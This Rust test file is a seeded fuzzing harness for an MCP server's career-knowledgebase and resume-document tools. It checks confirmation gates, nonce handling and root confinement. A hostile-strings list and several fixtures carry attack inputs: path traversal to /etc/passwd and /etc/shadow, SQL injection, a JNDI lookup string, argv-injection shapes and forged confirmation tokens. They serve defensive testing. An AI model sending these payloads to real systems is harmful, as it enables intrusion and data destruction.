//! Adversarial stress harness for the MCP surface.
//!
//! The per-defect regressions in `tests.rs` prove that each *known* attack is
//! blocked. This file asserts the properties those fixes exist to protect,
//! against randomly generated traffic — so a future change that reopens a hole
//! by a route nobody thought of still fails.
//!
//! Determinism matters more than entropy here: a seeded LCG means a failure is
//! reproducible from the seed printed in the assertion, and adding the `rand`
//! crate for a test harness would be a dependency the project does not need.
//!
//! The central property is [`the_knowledgebase_cannot_be_destroyed_without_a_genuine_confirmation`]:
//! whatever sequence of tool calls a client makes, seeded blocks survive unless
//! the client completed a real server-issued confirmation round trip.

use super::elicitation::ElicitationStore;
use super::protocol::JsonRpcRequest;
use super::server::StatelessMcpServer;
use super::tasks::TaskManager;
use crate::career_db::{Bullet, CareerDbState, DateRange, ExperienceBlock, SkillTag};
use serde_json::{json, Value};
use std::path::{Path, PathBuf};

/// Deterministic PRNG. Numerical Recipes LCG constants.
pub(crate) struct Lcg(u64);

impl Lcg {
    pub(crate) fn new(seed: u64) -> Self {
        // Avoid a zero state, which would make the sequence degenerate.
        Self(seed.wrapping_mul(6364136223846793005).wrapping_add(1))
    }

    pub(crate) fn next_u64(&mut self) -> u64 {
        self.0 = self
            .0
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        self.0 >> 11
    }

    pub(crate) fn below(&mut self, n: usize) -> usize {
        if n == 0 {
            0
        } else {
            (self.next_u64() % n as u64) as usize
        }
    }

    pub(crate) fn pick<'a, T>(&mut self, items: &'a [T]) -> &'a T {
        &items[self.below(items.len())]
    }

    pub(crate) fn bool(&mut self) -> bool {
        self.next_u64() % 2 == 0
    }
}

/// Strings chosen to break naive parsing, slicing, and escaping.
pub(crate) const HOSTILE_STRINGS: &[&str] = &[
    "",
    " ",
    "\0",
    "\u{feff}",                    // zero-width no-break space
    "\u{202e}gnirts desrever",     // RTL override
    "עברית ואנגלית mixed",         // bidi
    "🙂🙃👨‍👩‍👧‍👦",              // multi-codepoint grapheme clusters
    "e\u{0301}\u{0301}\u{0301}",   // stacked combining marks
    "../../../../etc/passwd",
    "'; DROP TABLE blocks; --",
    "%_\\",                        // SQL LIKE metacharacters
    "#let x = 1",                  // Typst code mode
    "${jndi:ldap://evil}",
    "{\"nested\":\"json\"}",
    "-rf",                         // leading dash: argv injection shape
    "file:///etc/shadow",
    "mcp://ingest/../escape",
    "fixture-block",               // a real id, to make collisions likely
];

pub(crate) fn hostile_string(rng: &mut Lcg) -> String {
    let base = rng.pick(HOSTILE_STRINGS).to_string();
    match rng.below(4) {
        0 => base,
        1 => base.repeat(1 + rng.below(3)),
        2 => format!("{base}{}", rng.next_u64()),
        _ => base.to_uppercase(),
    }
}

/// Arbitrary JSON, depth-bounded so generation terminates.
fn hostile_json(rng: &mut Lcg, depth: usize) -> Value {
    if depth == 0 {
        return match rng.below(5) {
            0 => Value::Null,
            1 => json!(rng.bool()),
            2 => json!(rng.next_u64()),
            3 => json!(-(rng.below(1000) as i64)),
            _ => Value::String(hostile_string(rng)),
        };
    }
    match rng.below(8) {
        0 => Value::Null,
        1 => json!(rng.bool()),
        2 => json!(rng.next_u64()),
        3 => json!(f64::from_bits(rng.next_u64())), // may be NaN/inf → serializes as null
        4 => Value::String(hostile_string(rng)),
        5 => {
            let n = rng.below(4);
            Value::Array((0..n).map(|_| hostile_json(rng, depth - 1)).collect())
        }
        _ => {
            let n = rng.below(5);
            let keys = [
                "query",
                "limit",
                "block_id",
                "block",
                "text",
                "title",
                "uri",
                "persona_id",
                "domain",
                "owner_kinds",
                "facts",
                "persona",
                "request_state",
                "input_responses",
                "source_type",
                "async",
            ];
            let mut obj = serde_json::Map::new();
            for _ in 0..n {
                obj.insert(rng.pick(&keys).to_string(), hostile_json(rng, depth - 1));
            }
            Value::Object(obj)
        }
    }
}

fn seeded_block(id: &str) -> ExperienceBlock {
    ExperienceBlock {
        id: id.to_string(),
        kind: "work".to_string(),
        title: "Senior Systems Engineer".to_string(),
        org: "Fixture Corp".to_string(),
        date_range: DateRange {
            start: "2022-01".to_string(),
            end: None,
        },
        personas: vec!["ai".to_string()],
        domains: vec!["developer tools".to_string()],
        skills: vec![SkillTag {
            name: "Rust".to_string(),
            level: 5,
            years: Some(6.0),
        }],
        seniority_level: "senior".to_string(),
        location: None,
        url: None,
        url_label: None,
        extra: None,
        bullets: vec![Bullet {
            id: format!("{id}-bullet"),
            canonical: "Built a Rust service, cutting cold start by 40%".to_string(),
            variants: serde_json::Map::new(),
            metrics: vec![crate::career_db::BulletMetric {
                value: "40%".to_string(),
                kind: "percent".to_string(),
            }],
            evidence_refs: Vec::new(),
            locked: false,
        }],
        facts: Vec::new(),
        notes: None,
        embedding_text: None,
        updated_at: "2026-01-01".to_string(),
    }
}

const SEEDED_IDS: &[&str] = &["block-a", "block-b", "block-c"];

fn stress_server() -> StatelessMcpServer {
    let db = CareerDbState::open_in_memory().expect("in-memory career db");
    db.with_conn(|conn| {
        for id in SEEDED_IDS {
            crate::career_db::upsert_block_blocking(conn, &seeded_block(id))?;
        }
        Ok(())
    })
    .expect("seed blocks");
    StatelessMcpServer::new(db)
}

async fn surviving_ids(server: &StatelessMcpServer) -> Vec<String> {
    let req = JsonRpcRequest::new(
        Some(json!(0)),
        "tools/call",
        Some(json!({ "name": "career_get_profile", "arguments": {} })),
    );
    let res = server.handle_request(None, req).await;
    res.result
        .and_then(|v| v["blocks"].as_array().cloned())
        .map(|blocks| {
            blocks
                .iter()
                .filter_map(|b| b["id"].as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default()
}

async fn call(server: &StatelessMcpServer, tool: &str, args: Value) -> super::protocol::JsonRpcResponse {
    let req = JsonRpcRequest::new(
        Some(json!("stress")),
        "tools/call",
        Some(json!({ "name": tool, "arguments": args })),
    );
    server.handle_request(None, req).await
}

/// THE invariant. Every destructive tool, driven with randomly generated and
/// deliberately forged arguments, must leave the seeded blocks intact — because
/// none of these sequences completes a genuine confirmation round trip.
#[tokio::test]
async fn the_knowledgebase_cannot_be_destroyed_without_a_genuine_confirmation() {
    let server = stress_server();
    let tools: Vec<String> = server
        .list_all_tools()
        .into_iter()
        .map(|t| t.name)
        .filter(|n| n.starts_with("career_"))
        .collect();

    // Plausible forgeries: valid base64 of JSON that looks like real state.
    let forged_states = [
        "e30=",                                                     // {}
        "eyJibG9ja0lkIjoiYmxvY2stYSJ9",                             // {"blockId":"block-a"}
        "eyJfX25vbmNlIjoiMDAwMDAwMDAtMDAwMC00MDAwLTgwMDAtMDAwMDAwMDAwMDAwIn0=", // {"__nonce":"0000...-0000"}
        "eyJ0b29sIjoiY2FyZWVyX2RlbGV0ZV9ibG9jayIsImJsb2NrSWQiOiJibG9jay1hIn0=", // {"tool":...,"blockId":...}
        "!!!not base64!!!",
        "",
    ];

    for seed in 0..400u64 {
        let mut rng = Lcg::new(seed);
        let tool = rng.pick(&tools).clone();

        let mut args = hostile_json(&mut rng, 2);
        if !args.is_object() {
            args = json!({});
        }
        if let Some(obj) = args.as_object_mut() {
            // Bias hard toward the destructive shapes: a purely random object
            // rarely names a real block, and the point is to attack the gate.
            if rng.bool() {
                obj.insert(
                    "block_id".to_string(),
                    json!(rng.pick(SEEDED_IDS).to_string()),
                );
            }
            if rng.bool() {
                obj.insert(
                    "request_state".to_string(),
                    json!(rng.pick(&forged_states).to_string()),
                );
            }
            if rng.bool() {
                obj.insert("input_responses".to_string(), json!({ "confirm": true }));
            }
            if rng.bool() {
                // An emptied block: the overwrite-as-delete shape.
                let mut gutted = seeded_block(rng.pick(SEEDED_IDS));
                gutted.bullets.clear();
                obj.insert(
                    "block".to_string(),
                    serde_json::to_value(gutted).unwrap_or(Value::Null),
                );
            }
        }

        // A panic here fails the test; that is deliberate.
        let _ = call(&server, &tool, args).await;

        let alive = surviving_ids(&server).await;
        for id in SEEDED_IDS {
            assert!(
                alive.iter().any(|a| a == id),
                "seed {seed}: tool '{tool}' destroyed block '{id}' without a genuine confirmation; survivors: {alive:?}"
            );
        }
    }
}

/// The gate must not be so strict that the legitimate flow stops working.
/// A property that only ever says "no" is trivially satisfied by a broken tool.
#[tokio::test]
async fn the_genuine_confirmation_round_trip_still_works() {
    let server = stress_server();

    let elicit = call(&server, "career_delete_block", json!({ "block_id": "block-a" }))
        .await
        .result
        .expect("elicitation");
    assert_eq!(elicit["resultType"], "inputRequired");
    let state = elicit["requestState"].as_str().expect("requestState");

    let done = call(
        &server,
        "career_delete_block",
        json!({
            "block_id": "block-a",
            "input_responses": { "confirm": true },
            "request_state": state
        }),
    )
    .await;
    assert!(done.error.is_none(), "genuine flow failed: {:?}", done.error);

    let alive = surviving_ids(&server).await;
    assert!(
        !alive.iter().any(|a| a == "block-a"),
        "a confirmed deletion must actually delete"
    );
    assert!(
        alive.iter().any(|a| a == "block-b"),
        "and must not touch anything else"
    );
}

/// No tool call, however malformed, may panic the dispatcher or produce a
/// malformed JSON-RPC response.
#[tokio::test]
async fn the_dispatcher_survives_arbitrary_arguments() {
    let server = stress_server();
    let tools: Vec<String> = server.list_all_tools().into_iter().map(|t| t.name).collect();

    for seed in 0..600u64 {
        let mut rng = Lcg::new(seed ^ 0xA5A5_A5A5);
        let tool = rng.pick(&tools).clone();
        let args = hostile_json(&mut rng, 3);

        let res = call(&server, &tool, args.clone()).await;

        assert_eq!(res.jsonrpc, "2.0", "seed {seed}: bad envelope for '{tool}'");
        assert!(
            res.result.is_some() != res.error.is_some(),
            "seed {seed}: '{tool}' returned both or neither result and error"
        );
        if let Some(err) = res.error {
            assert!(
                !err.message.is_empty(),
                "seed {seed}: '{tool}' returned an empty error message for args {args}"
            );
        }
    }
}

/// Arbitrary JSON-RPC envelopes, not just arbitrary tool arguments.
#[tokio::test]
async fn the_router_survives_arbitrary_methods_and_params() {
    let server = stress_server();
    let methods = [
        "tools/list",
        "tools/call",
        "resources/list",
        "resources/read",
        "prompts/list",
        "prompts/get",
        "tasks/get",
        "tasks/cancel",
        "tasks/list",
        "notifications/initialized",
        "",
        "../../etc/passwd",
        "tools/call\0",
        "TOOLS/CALL",
    ];

    for seed in 0..400u64 {
        let mut rng = Lcg::new(seed ^ 0x5EED);
        let method = rng.pick(&methods).to_string();
        let params = if rng.bool() {
            Some(hostile_json(&mut rng, 3))
        } else {
            None
        };
        let id = match rng.below(4) {
            0 => None,
            1 => Some(json!(rng.next_u64())),
            2 => Some(Value::Null),
            _ => Some(json!(hostile_string(&mut rng))),
        };

        let res = server
            .handle_request(None, JsonRpcRequest::new(id.clone(), &method, params))
            .await;

        assert_eq!(res.jsonrpc, "2.0", "seed {seed}: bad envelope for '{method}'");
        assert_eq!(
            res.id, id,
            "seed {seed}: the response must echo the request id"
        );
    }
}

/// The nonce store must never accept a token it did not issue, and never accept
/// one twice, under randomized interleaving.
#[test]
fn the_elicitation_store_only_ever_honours_its_own_live_tokens() {
    let store = ElicitationStore::new();
    let subjects = ["a", "b", "c", "d"];
    let mut issued: Vec<(String, String)> = Vec::new();

    for seed in 0..2_000u64 {
        let mut rng = Lcg::new(seed ^ 0xBEEF);
        match rng.below(3) {
            // Issue
            0 => {
                let subject = rng.pick(&subjects).to_string();
                let nonce = store.issue("career_delete_block", &subject);
                issued.push((nonce, subject));
            }
            // Redeem something genuine
            1 if !issued.is_empty() => {
                let idx = rng.below(issued.len());
                let (nonce, subject) = issued.remove(idx);
                // First redemption may succeed; a second must not.
                let _ = store.consume(&nonce, "career_delete_block", &subject);
                assert!(
                    store
                        .consume(&nonce, "career_delete_block", &subject)
                        .is_err(),
                    "seed {seed}: a token was honoured twice"
                );
            }
            // Attack
            _ => {
                let forged = hostile_string(&mut rng);
                assert!(
                    store
                        .consume(&forged, "career_delete_block", rng.pick(&subjects))
                        .is_err(),
                    "seed {seed}: forged token '{forged}' was accepted"
                );
                // A genuine token used on the wrong subject must also fail.
                if let Some((nonce, subject)) = issued.first() {
                    let wrong = subjects
                        .iter()
                        .find(|s| *s != subject)
                        .copied()
                        .unwrap_or("z");
                    assert!(
                        store.consume(nonce, "career_delete_block", wrong).is_err(),
                        "seed {seed}: a token crossed subjects"
                    );
                    issued.remove(0);
                }
            }
        }
        assert!(
            store.pending_count() <= 256,
            "seed {seed}: the pending table grew past its cap"
        );
    }
}

/// Randomized task lifecycles must leave the manager bounded and consistent.
#[test]
fn the_task_manager_stays_bounded_and_consistent() {
    let mgr = TaskManager::new();
    let mut live: Vec<String> = Vec::new();

    for seed in 0..3_000u64 {
        let mut rng = Lcg::new(seed ^ 0xC0FFEE);
        match rng.below(5) {
            0 => {
                let h = mgr.create_task("stress", Some(rng.below(2) as u64));
                live.push(h.task_id);
            }
            1 if !live.is_empty() => {
                let id = live.remove(rng.below(live.len()));
                mgr.complete_task(&id, json!({ "seed": seed }));
            }
            2 if !live.is_empty() => {
                let id = live.remove(rng.below(live.len()));
                mgr.fail_task(&id, "stress failure".to_string());
            }
            3 if !live.is_empty() => {
                let id = live.remove(rng.below(live.len()));
                mgr.cancel_task(&id);
            }
            _ => {
                let tasks = mgr.list_tasks();
                // A terminal task must never revert, and progress stays in range.
                for t in &tasks {
                    assert!(
                        (0.0..=1.0).contains(&t.progress),
                        "seed {seed}: progress {} out of range",
                        t.progress
                    );
                }
            }
        }

        assert!(
            mgr.task_count() <= 512 + 64,
            "seed {seed}: task table grew to {} records",
            mgr.task_count()
        );
    }
}

/// A completed task's result must never be silently lost, whatever else is
/// happening to the table around it.
#[test]
fn a_completed_result_is_never_silently_dropped() {
    let mgr = TaskManager::new();
    for seed in 0..500u64 {
        let mut rng = Lcg::new(seed);
        let h = mgr.create_task("payload", Some(600));
        let payload = json!({ "seed": seed, "noise": hostile_string(&mut rng) });
        mgr.complete_task(&h.task_id, payload.clone());

        let got = mgr
            .get_task(&h.task_id)
            .unwrap_or_else(|| panic!("seed {seed}: completed task vanished"));
        assert_eq!(
            got.result,
            Some(payload),
            "seed {seed}: the recorded result differs from what was stored"
        );
    }
}

// --- Plugins 1.0: the resume-document surface ---
//
// The document tools touch the user's real filesystem, so their properties are
// asserted with the same seeded-hostility discipline as the knowledgebase.

/// A temp project registered with the server, with a sentinel sibling that
/// must never be touched.
struct DocFixture {
    server: StatelessMcpServer,
    root: PathBuf,
    sentinel: PathBuf,
    seed_resume: String,
    seed_notes: String,
}

impl Drop for DocFixture {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.root);
        let _ = std::fs::remove_dir_all(&self.sentinel);
    }
}

impl DocFixture {
    fn new(tag: &str) -> Self {
        let base = std::env::temp_dir().join(format!(
            "devprism-docstress-{tag}-{}-{}",
            std::process::id(),
            uuid::Uuid::new_v4().simple()
        ));
        let root = base.join("project");
        let sentinel = base.join("sentinel-outside");
        std::fs::create_dir_all(root.join("chapters")).expect("fixture root");
        std::fs::create_dir_all(&sentinel).expect("sentinel dir");
        let db = CareerDbState::open_in_memory().expect("in-memory career db");
        let server = StatelessMcpServer::new(db.clone());
        server
            .context_db()
            .with_conn(|conn| {
                crate::career_db::upsert_known_project_blocking(
                    conn,
                    &root.to_string_lossy(),
                    "Doc Stress",
                )
            })
            .expect("register fixture project");
        let seed_resume =
            "= Jane Doe\n- Cut p99 by 25%\n".to_string();
        let seed_notes = "notes ".repeat(80); // non-trivial, guards reduction
        std::fs::write(root.join("main.typ"), &seed_resume).expect("seed main");
        std::fs::write(root.join("chapters").join("notes.md"), &seed_notes).expect("seed notes");
        Self {
            server,
            root,
            sentinel,
            seed_resume,
            seed_notes,
        }
    }

    fn master_intact(&self) -> bool {
        std::fs::read_to_string(self.root.join("main.typ")).is_ok_and(|c| c == self.seed_resume)
    }

    fn notes_intact(&self) -> bool {
        std::fs::read_to_string(self.root.join("chapters").join("notes.md"))
            .is_ok_and(|c| c == self.seed_notes)
    }

    fn sentinel_untouched(&self) -> bool {
        // Nothing may appear inside, and the dir itself must still exist.
        std::fs::read_dir(&self.sentinel)
            .map(|mut d| d.next().is_none())
            .unwrap_or(false)
    }

    fn variant_count(&self) -> usize {
        std::fs::read_dir(self.root.join(".prism").join("variants"))
            .map(|d| d.filter_map(Result::ok).count())
            .unwrap_or(0)
    }
}

fn doc_tools(server: &StatelessMcpServer) -> Vec<String> {
    server
        .list_all_tools()
        .into_iter()
        .map(|t| t.name)
        .filter(|n| {
            n.starts_with("resume_doc_")
                || n.starts_with("resume_variant_")
                || n == "resume_save_synthesis"
                || n == "resume_compile_file"
        })
        .collect()
}

/// THE filesystem invariant: no sequence of hostile document-tool calls —
/// forged shas, traversal paths, absolute escapes, hostile variant ids — may
/// modify a master file or create anything outside a registered root. Variant
/// folders are additive and allowed; deleting one requires the human gate.
#[tokio::test]
async fn document_tools_cannot_touch_masters_or_escape_the_registered_root() {
    let fx = DocFixture::new("escape");

    let paths_to_try = [
        "../sentinel-outside/pwned.typ",
        "../../pwned.typ",
        "/tmp/devprism-docstress-abs-pwned.typ",
        "main.typ",
        "chapters/notes.md",
        ".prism/variants/ghost/main.typ",
        "-rf",
        "",
    ];
    let forged_shas = [
        "deadbeef".repeat(5),
        String::new(),
        "da39a3ee5e6b4b0d3255bfef95601890afd80709".to_string(), // sha1("") — plausible!
    ];

    let tools = doc_tools(&fx.server);

    for seed in 0..300u64 {
        let mut rng = Lcg::new(seed ^ 0xD0C);
        let tool = rng.pick(&tools).clone();
        let mut args = hostile_json(&mut rng, 2);
        if !args.is_object() {
            args = json!({});
        }
        if let Some(obj) = args.as_object_mut() {
            obj.insert(
                "project_root".to_string(),
                json!(rng.pick(&[
                    fx.root.to_string_lossy().to_string(),
                    String::new(),
                    "../../../etc".to_string(),
                ])),
            );
            if rng.bool() {
                obj.insert(
                    "file_path".to_string(),
                    json!(rng.pick(&paths_to_try).to_string()),
                );
            }
            if rng.bool() {
                obj.insert(
                    "expected_sha1".to_string(),
                    json!(rng.pick(&forged_shas).to_string()),
                );
            }
            if rng.bool() {
                obj.insert("allow_major_reduction".to_string(), json!(true));
            }
            if rng.bool() {
                obj.insert("variant_id".to_string(), json!(hostile_string(&mut rng)));
            }
            if rng.bool() {
                obj.insert(
                    "request_state".to_string(),
                    json!("eyJfX25vbmNlIjoiZm9yZ2VkIn0="),
                );
                obj.insert("input_responses".to_string(), json!({ "confirm": true }));
            }
            if rng.bool() {
                obj.insert("content".to_string(), json!(hostile_string(&mut rng)));
            }
            if rng.bool() {
                obj.insert("edits".to_string(), json!([{
                    "old_string": rng.pick(&HOSTILE_STRINGS).to_string(),
                    "new_string": "x",
                }]));
            }
        }

        let _ = call(&fx.server, &tool, args).await;

        assert!(
            fx.master_intact(),
            "seed {seed}: tool '{tool}' modified the master without a verified round trip"
        );
        assert!(
            fx.sentinel_untouched(),
            "seed {seed}: tool '{tool}' escaped the registered root"
        );
    }
}

/// Deletion of variants is gated like block deletion: random hostile traffic
/// can add variants but never remove one.
#[tokio::test]
async fn variants_survive_hostile_delete_traffic_without_confirmation() {
    let fx = DocFixture::new("vargate");
    let root = fx.root.to_string_lossy().to_string();

    // One legitimate variant to protect.
    let created = call(
        &fx.server,
        "resume_variant_create",
        json!({ "project_root": root, "name": "Protected" }),
    )
    .await;
    assert!(created.error.is_none(), "setup failed: {:?}", created.error);
    let baseline = fx.variant_count();

    for seed in 0..200u64 {
        let mut rng = Lcg::new(seed ^ 0xDE1);
        let mut args = hostile_json(&mut rng, 2);
        if !args.is_object() {
            args = json!({});
        }
        if let Some(obj) = args.as_object_mut() {
            obj.insert("project_root".to_string(), json!(root));
            obj.insert("variant_id".to_string(), json!(rng.pick(&[
                "../..", "..", ".", "", "protected", "%2e%2e",
            ]).to_string()));
            if rng.bool() {
                obj.insert("request_state".to_string(), json!("Zm9yZ2Vk"));
                obj.insert("input_responses".to_string(), json!({ "confirm": true }));
            }
        }
        // The legitimate variant's slug is unknown to the fuzzer; whatever it
        // guesses must not delete anything.
        let _ = call(&fx.server, "resume_variant_delete", args).await;
        assert_eq!(
            fx.variant_count(),
            baseline,
            "seed {seed}: a variant disappeared without a genuine confirmation"
        );
    }

    // And the honest round trip still works (gate is not a wall).
    let list = call(
        &fx.server,
        "resume_variant_list",
        json!({ "project_root": root }),
    )
    .await
    .result
    .expect("list");
    let vid = list["variants"][0]["id"].as_str().expect("id").to_string();

    let challenge = call(
        &fx.server,
        "resume_variant_delete",
        json!({ "project_root": root, "variant_id": vid }),
    )
    .await
    .result
    .expect("challenge");
    let state = challenge["requestState"].as_str().expect("state").to_string();
    let done = call(
        &fx.server,
        "resume_variant_delete",
        json!({
            "project_root": root,
            "variant_id": vid,
            "request_state": state,
            "input_responses": { "confirm": true },
        }),
    )
    .await;
    assert!(done.error.is_none(), "genuine flow failed: {:?}", done.error);
    assert_eq!(fx.variant_count(), baseline - 1, "confirmed delete must delete");
}

/// Optimistic concurrency: two interleaved editors cannot silently clobber
/// each other. The second writer is refused and told the current sha.
#[tokio::test]
async fn concurrent_writers_are_serialised_by_expected_sha() {
    let fx = DocFixture::new("occ");
    let root = fx.root.to_string_lossy().to_string();

    let read = call(
        &fx.server,
        "resume_doc_read",
        json!({ "project_root": root, "file_path": "main.typ" }),
    )
    .await
    .result
    .expect("read");
    let stale_sha = read["sha1"].as_str().expect("sha").to_string();

    // Writer A lands first with the valid sha.
    let a = call(
        &fx.server,
        "resume_doc_write",
        json!({
            "project_root": root,
            "file_path": "main.typ",
            "content": "= Jane Doe\n- Rewrote by A\n",
            "expected_sha1": stale_sha,
        }),
    )
    .await;
    assert!(a.error.is_none(), "first writer failed: {:?}", a.error);

    // Writer B races with the now-stale sha and must be refused.
    let b = call(
        &fx.server,
        "resume_doc_write",
        json!({
            "project_root": root,
            "file_path": "main.typ",
            "content": "= Jane Doe\n- Rewrote by B\n",
            "expected_sha1": stale_sha,
        }),
    )
    .await;
    let err = b.error.expect("stale writer must be refused");
    assert!(err.message.contains("mismatch"), "unexpected refusal: {}", err.message);
    let current = std::fs::read_to_string(fx.root.join("main.typ")).unwrap();
    assert!(current.contains("Rewrote by A"), "A's write was lost");

    // The refusal names the CURRENT sha, so B can recover honestly.
    let current_sha = crate::plugins::path_guard::sha1_hex(current.as_bytes());
    assert!(
        err.message.contains(&current_sha),
        "refusal must carry the fresh sha: {}",
        err.message
    );
}

/// Fuzzing every document tool with arbitrary argument shapes must neither
/// panic the dispatcher nor leave half-written files (temp leftovers) anywhere.
#[tokio::test]
async fn document_tools_never_panic_or_leak_temp_files() {
    let fx = DocFixture::new("nofuzz-leak");
    let tools = doc_tools(&fx.server);

    for seed in 0..250u64 {
        let mut rng = Lcg::new(seed ^ 0xF00D);
        let tool = rng.pick(&tools).clone();
        let args = hostile_json(&mut rng, 3);
        let res = call(&fx.server, &tool, args).await;
        assert!(
            res.result.is_some() != res.error.is_some(),
            "seed {seed}: '{tool}' returned both or neither"
        );
        if let Some(err) = res.error {
            assert!(!err.message.is_empty());
        }
    }

    fn walk_temps(dir: &Path, out: &mut Vec<PathBuf>) {
        let Ok(entries) = std::fs::read_dir(dir) else { return };
        for e in entries.flatten() {
            let p = e.path();
            if p.is_dir() {
                if p.file_name().is_some_and(|n| n == ".prism") {
                    continue; // backups/build live here legitimately
                }
                walk_temps(&p, out);
            } else if p
                .file_name()
                .and_then(|n| n.to_str())
                .is_some_and(|n| n.contains(".tmp-"))
            {
                out.push(p);
            }
        }
    }
    let mut temps = Vec::new();
    walk_temps(&fx.root, &mut temps);
    assert!(
        temps.is_empty(),
        "temp files leaked after hostile fuzzing: {:?}",
        temps.iter().take(5).collect::<Vec<_>>()
    );
}
